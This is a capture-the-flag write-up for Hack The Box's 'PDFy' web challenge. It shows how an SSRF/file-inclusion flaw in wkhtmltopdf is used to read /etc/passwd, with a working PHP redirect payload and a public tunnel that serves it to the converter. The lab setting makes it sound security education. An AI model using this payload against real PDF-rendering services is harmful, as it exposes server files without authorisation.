# [PDFy](https://app.hackthebox.com/challenges/PDFy) Writeup [HTB]
_Web_

## Investigating the website
This is a black box challenge, meaning we don't have access to the website code. Therefore, I begin with analyzing its behavior.
It's a simple website that takes a URL as input and returns its PDF version, computing it server-side.

Since I know from the challenge description that the flag is in `/etc/passwd`, my first attempt is simply entering the URL:
```
file:///etc/passwd
```
This attempt doesn't work, as the website returns me a "URL malformed" response.

I then try to send a random, non-existent URL. This provides me with a very interesting result:
```
Request:
    "url":"http://sjdfhdjfh"
Response:
    "level": "error"
    "message": "There was an error: Error generating PDF: Command '['wkhtmltopdf', '--margin-top', '0', '--margin-right', '0', '--margin-bottom', '0', '--margin-left', '0', 'http://sjdfhdjfh', 'application/static/pdfs/07727dc8981945ff4d8a5d4c2c76.pdf']' returned non-zero exit status 1."
```
I now have the tool name!

## Breaking the PDF-ification
I immediately search for some known `wkhtmltopdf` exploits on the Internet, and I find out that it's vulnerable to local file inclusion (LFI) and server-site request forgery (SSRF). I also find [this interesting exploit](https://exploit-notes.hdks.org/exploit/web/security-risk/wkhtmltopdf-ssrf/), which I adapt to my use-case to get the file.

The exploit is composed of three parts.

### 1 > Preparing the malicious file
First, I need to craft a not-suspicious-at-all file, referencing `/etc/passwd`. Let's call it `sus.php`.
```html
<!DOCTYPE html>
<html>
<body>
    <?php header('location:file:///etc/passwd'); ?>
</body>
</html>
```
When this file is transformed in PDF on the server side, it will automatically include the content of `/etc/passwd`.

### 2 > Exposing the malicious file
Now that the file is ready, we need to expose it to the Internet, for our website to access it. 
To do so, I first create a php server on `localhost`:
```sh
php -S localhost:8000
```
I then use [serveo](https://serveo.net/) to expose this local server.

### 3 > Generate the PDF!
Finally, it's time to generate! I prepare the URL and feed it to PDFy:
```
https://e794c1568d1a1ad10d344a9ab47cb330.serveo.net/sus.php
```
I download the resulting PDF, open it, and get the flag!
